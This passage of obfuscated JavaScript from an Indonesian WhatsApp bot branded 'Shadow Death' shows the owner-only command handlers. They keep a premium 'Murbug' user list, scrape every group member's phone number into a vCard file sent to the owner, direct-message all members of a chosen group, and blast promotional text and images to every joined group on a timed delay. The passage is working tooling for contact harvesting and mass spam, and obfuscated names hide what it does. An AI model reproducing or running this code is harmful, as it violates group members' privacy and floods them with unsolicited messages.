            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "cmd\n\n ketik *.listrespon* untuk melihat semua cmd" + "\n");
          }
          const _0x4f52f2 = _0x1aeaf2.toLowerCase();
          let _0x3a821d = list.find(_0x57dc78 => _0x57dc78.cmd == _0x4f52f2.toLowerCase());
          if (!_0x3a821d) {
            return _0x2f6673.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon");
          }
          let _0x14aa74 = list.indexOf(_0x3a821d);
          await list.splice(_0x14aa74, 0x1);
          fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 0x2));
          _0x2f6673.reply("Berhasil menghapus cmd respon *" + _0x4f52f2.toLowerCase() + "* dari database respon");
        }
        break;
      case "listrespon":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          if (list.length < 0x1) {
            return _0x2f6673.reply("Tidak ada cmd respon");
          }
          let _0x22a3ff = "\n *#- List all cmd response*\n";
          await list.forEach(_0x53f814 => _0x22a3ff += "\n* *Cmd :* " + _0x53f814.cmd + "\n");
          _0x2f6673.reply('' + _0x22a3ff);
        }
        break;
      case "addmurid":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2 && !_0x2f6673.quoted) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "6285###" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          const _0x34c27a = _0x2f6673.quoted ? _0x2f6673.quoted.sender : _0x1aeaf2.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          const _0xd5c4 = _0x34c27a.split('@')[0x0];
          if (_0xd5c4 === global.owner || premium.includes(_0x34c27a) || _0x34c27a === _0x3a968e) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Nomor " + _0xd5c4 + " sudah menjadi Murbug!"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          premium.push(_0x34c27a);
          await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 0x2));
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + ("Berhasil menambah " + _0xd5c4 + " ke Murbug"),
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "listmurid":
        {
          if (premium.length < 0x1) {
            return _0x2f6673.reply("Tidak ada user Murbug");
          }
          let _0x1a35fd = "\n *List Murbug Nika*\n";
          for (let _0x3bff5f of premium) {
            _0x1a35fd += "\n* " + _0x3bff5f.split('@')[0x0] + "\n* *Tag :* @" + _0x3bff5f.split('@')[0x0] + "\n";
          }
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x1a35fd,
            'mentions': premium
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case 'delmurid':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.quoted && !_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "6285###" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          const _0x5cd385 = _0x2f6673.quoted ? _0x2f6673.quoted.sender : _0x1aeaf2.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          const _0x4fbcb2 = _0x5cd385.split('@')[0x0];
          if (_0x4fbcb2 == global.owner || _0x5cd385 == _0x3a968e) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Dia Owner Anjg",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!premium.includes(_0x5cd385)) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Nomor " + _0x4fbcb2 + " bukan reseller!"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x169fe8 = premium.indexOf(_0x5cd385);
          await premium.splice(_0x169fe8, 0x1);
          await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 0x2));
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + ("Berhasil menghapus " + _0x4fbcb2 + " Dari Murbug Nika"),
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "savekontak":
        {
          if (!isOwner) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "idgrupnya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x75cad5 = await _0x47285b.groupMetadata(_0x1aeaf2);
          const _0x3d3f8a = await _0x75cad5.participants.filter(_0x588d93 => _0x588d93.id.endsWith(".net")).map(_0x5628d1 => _0x5628d1.id);
          for (let _0x3fbd6b of _0x3d3f8a) {
            if (_0x3fbd6b !== _0x3a968e && _0x3fbd6b.split('@')[0x0] !== global.owner) {
              contacts.push(_0x3fbd6b);
              fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            }
          }
          try {
            const _0x2b4fdc = [...new Set(contacts)];
            const _0x57f913 = _0x2b4fdc.map((_0x267974, _0x48a989) => {
              const _0x30584f = ["BEGIN:VCARD", "VERSION:3.0", "FN:Buyer Depay - " + _0x267974.split('@')[0x0], "TEL;type=CELL;type=VOICE;waid=" + _0x267974.split('@')[0x0] + ':+' + _0x267974.split('@')[0x0], "END:VCARD", ''].join("\n");
              return _0x30584f;
            }).join('');
            fs.writeFileSync('./library/database/contacts.vcf', _0x57f913, "utf8");
          } catch (_0x3f4f02) {
            _0x2f6673.reply(_0x3f4f02.toString());
          } finally {
            if (_0x2f6673.chat !== _0x2f6673.sender) {
              await _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("*Berhasil membuat file kontak ✅*\nFile kontak telah dikirim ke private chat\nTotal *" + _0x3d3f8a.length + "* kontak"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            await _0x47285b.sendMessage(_0x2f6673.sender, {
              'document': fs.readFileSync("./library/database/contacts.vcf"),
              'fileName': "contacts.vcf",
              'caption': "File kontak berhasil dibuat ✅\nTotal *" + _0x3d3f8a.length + "* kontak",
              'mimetype': "text/vcard"
            }, {
              'quoted': _0x2f6673
            });
            contacts.splice(0x0, contacts.length);
            await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            await fs.writeFileSync("./library/database/contacts.vcf", '');
          }
        }
        break;
      case "savekontak2":
        {
          if (!isOwner) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0xf95597 = await _0x2f6673.metadata;
          const _0x539d6e = await _0xf95597.participants.filter(_0x1a0bd3 => _0x1a0bd3.id.endsWith(".net")).map(_0x3c1802 => _0x3c1802.id);
          for (let _0x2de88a of _0x539d6e) {
            if (_0x2de88a !== _0x3a968e && _0x2de88a.split('@')[0x0] !== global.owner) {
              contacts.push(_0x2de88a);
              fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts));
            }
          }
          try {
            const _0x5de34e = [...new Set(contacts)];
            const _0xa0b053 = _0x5de34e.map((_0x5d20d7, _0x278ca8) => {
              const _0x286a9b = ['BEGIN:VCARD', 'VERSION:3.0', "FN:Buyer Depay - " + _0x5d20d7.split('@')[0x0], "TEL;type=CELL;type=VOICE;waid=" + _0x5d20d7.split('@')[0x0] + ':+' + _0x5d20d7.split('@')[0x0], "END:VCARD", ''].join("\n");
              return _0x286a9b;
            }).join('');
            fs.writeFileSync("./library/database/contacts.vcf", _0xa0b053, "utf8");
          } catch (_0xbe7a6d) {
            _0x2f6673.reply(_0xbe7a6d.toString());
          } finally {
            if (_0x2f6673.chat !== _0x2f6673.sender) {
              await _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("*Berhasil membuat file kontak ✅*\nFile kontak telah dikirim ke private chat\nTotal *" + _0x539d6e.length + "* kontak"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            await _0x47285b.sendMessage(_0x2f6673.sender, {
              'document': fs.readFileSync("./library/database/contacts.vcf"),
              'fileName': "contacts.vcf",
              'caption': "File kontak berhasil dibuat ✅\nTotal *" + _0x539d6e.length + "* kontak",
              'mimetype': "text/vcard"
            }, {
              'quoted': _0x2f6673
            });
            contacts.splice(0x0, contacts.length);
            await fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts));
            await fs.writeFileSync("./library/database/contacts.vcf", '');
          }
        }
        break;
      case "pushkontak":
        {
          if (!isOwner) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "pesannya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          const _0x8f2fd3 = await _0x47285b.groupFetchAllParticipating();
          let _0x5aaa35 = await Object.keys(_0x8f2fd3);
          global.textpushkontak = _0x1aeaf2;
          let _0x480a5c = [];
          for (let _0x26156c of _0x5aaa35) {
            await _0x480a5c.push({
              'title': _0x8f2fd3[_0x26156c].subject,
              'id': ".respushkontak " + _0x26156c,
              'description': _0x8f2fd3[_0x26156c].participants.length + " Member"
            });
          }
          return _0x47285b.sendMessage(_0x2f6673.chat, {
            'buttons': [{
              'buttonId': "action",
              'buttonText': {
                'displayText': "ini pesan interactiveMeta"
              },
              'type': 0x4,
              'nativeFlowInfo': {
                'name': 'single_select',
                'paramsJson': JSON.stringify({
                  'title': "Pilih Grup",
                  'sections': [{
                    'title': "List Grup Chat",
                    'rows': [..._0x480a5c]
                  }]
                })
              }
            }],
            'footer': "Shadow Death",
            'headerType': 0x1,
            'viewOnce': true,
            'text': "Pilih Target Grup Pushkontak\n",
            'contextInfo': {
              'isForwarded': true,
              'mentionedJid': [_0x2f6673.sender, global.owner + "@s.whatsapp.net"]
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "respushkontak":
        {
          if (!isOwner) {
            return;
          }
          if (!_0x1aeaf2) {
            return;
          }
          if (!global.textpushkontak) {
            return;
          }
          const _0x371263 = global.textpushkontak;
          const _0x3d4b7e = _0x2f6673.chat;
          const _0x86291c = await _0x47285b.groupMetadata(_0x1aeaf2);
          const _0x26b973 = await _0x86291c.participants.filter(_0x1a4daf => _0x1a4daf.id.endsWith(".net")).map(_0x3a4791 => _0x3a4791.id);
          await _0x2f6673.reply("Memproses *pushkontak* ke dalam grup *" + _0x86291c.subject + '*');
          for (let _0x3d2843 of _0x26b973) {
            if (_0x3d2843 !== _0x3a968e && _0x3d2843.split('@')[0x0] !== global.owner) {
              await _0x47285b.sendMessage(_0x3d2843, {
                'text': _0x371263
              }, {
                'quoted': _0x4f00c0
              });
              await sleep(global.delayPushkontak);
            }
          }
          delete global.textpushkontak;
          await _0x47285b.sendMessage(_0x3d4b7e, {
            'text': "*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : " + _0x26b973.length
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "pushkontak2":
        {
          if (!isOwner) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.isGroup) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.group,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + 'pesannya' + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          const _0x201d00 = _0x2f6673.chat;
          const _0xc09866 = await _0x47285b.groupMetadata(_0x2f6673.chat);
          const _0x2af2ce = await _0xc09866.participants.filter(_0x45d135 => _0x45d135.id.endsWith(".net")).map(_0x1ae6a8 => _0x1ae6a8.id);
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + ("Memproses pushkontak ke *" + _0x2af2ce.length + "* member grup"),
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
          for (let _0x5508d6 of _0x2af2ce) {
            if (_0x5508d6 !== _0x3a968e && _0x5508d6.split('@')[0x0] !== global.owner) {
              await _0x47285b.sendMessage(_0x5508d6, {
                'text': _0x1aeaf2
              }, {
                'quoted': _0x4f00c0
              });
              await sleep(global.delayPushkontak);
            }
          }
          await _0x47285b.sendMessage(_0x201d00, {
            'text': "*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : " + _0x2af2ce.length
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "jpmslide":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x4f7c72 = await _0x47285b.groupFetchAllParticipating();
          let _0x516cd1 = await Object.keys(_0x4f7c72);
          let _0x16d2bb = 0x0;
          const _0x53eae7 = _0x2f6673.chat;
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + ("Memproses *jpmslide* Ke " + _0x516cd1.length + " grup"),
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
          for (let _0x497874 of _0x516cd1) {
            if (global.db.groups[_0x497874] && global.db.groups[_0x497874].blacklistjpm && global.db.groups[_0x497874].blacklistjpm == true) {
              continue;
            }
            try {
              await _0xcc406d(_0x497874);
              _0x16d2bb += 0x1;
            } catch {}
            await sleep(global.delayJpm);
          }
          await _0x47285b.sendMessage(_0x53eae7, {
            'text': "*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : " + _0x16d2bb
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case 'jpmslidehidetag':
      case "jpmslideht":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x117f50 = await _0x47285b.groupFetchAllParticipating();
          let _0x13a72a = await Object.keys(_0x117f50);
          let _0x24d099 = 0x0;
          const _0x4ccd9c = _0x2f6673.chat;
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + ("Memproses *jpmslide hidetag* Ke " + _0x13a72a.length + " grup"),
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
          for (let _0x48f713 of _0x13a72a) {
            if (global.db.groups[_0x48f713] && global.db.groups[_0x48f713].blacklistjpm && global.db.groups[_0x48f713].blacklistjpm == true) {
              continue;
            }
            try {
              await _0xcc406d(_0x48f713, _0x117f50[_0x48f713].participants.map(_0x525fea => _0x525fea.id));
              _0x24d099 += 0x1;
            } catch {}
            await sleep(global.delayJpm);
          }
          await _0x47285b.sendMessage(_0x4ccd9c, {
            'text': "*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : " + _0x24d099
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "jualan":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!q) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "teksnya" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x3648ff = await _0x47285b.groupFetchAllParticipating();
          let _0x589440 = await Object.keys(_0x3648ff);
          let _0x2b47aa = 0x0;
          const _0x1cfb8d = _0x2f6673.chat;
          await _0x2f6673.reply("Memproses *jpm* teks Ke " + _0x589440.length + " grup");
          for (let _0x184aa2 of _0x589440) {
            if (global.db.groups[_0x184aa2] && global.db.groups[_0x184aa2].blacklistjpm && global.db.groups[_0x184aa2].blacklistjpm == true) {
              continue;
            }
            try {
              await _0x47285b.sendMessage(_0x184aa2, {
                'text': '' + _0x1aeaf2
              }, {
                'quoted': _0x1db9d5
              });
              _0x2b47aa += 0x1;
            } catch {}
            await sleep(global.delayJpm);
          }
          await _0x47285b.sendMessage(_0x1cfb8d, {
            'text': "*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : " + _0x2b47aa
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "jpm2":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!q) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "teks dengan mengirim foto" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!/image/.test(_0xac161)) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "teks dengan mengirim foto" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          const _0xf50964 = await _0x47285b.groupFetchAllParticipating();
          const _0x4adb92 = await Object.keys(_0xf50964);
          let _0x13913a = 0x0;
          const _0x53bf0b = _0x2f6673.chat;
          const _0x33a678 = await _0x47285b.downloadAndSaveMediaMessage(_0x13d557);
          await _0x2f6673.reply("Memproses *jpm* teks & foto Ke " + _0x4adb92.length + " grup");
          for (let _0x12bdc0 of _0x4adb92) {
            if (global.db.groups[_0x12bdc0] && global.db.groups[_0x12bdc0].blacklistjpm && global.db.groups[_0x12bdc0].blacklistjpm == true) {
              continue;
            }
            try {
              await _0x47285b.sendMessage(_0x12bdc0, {
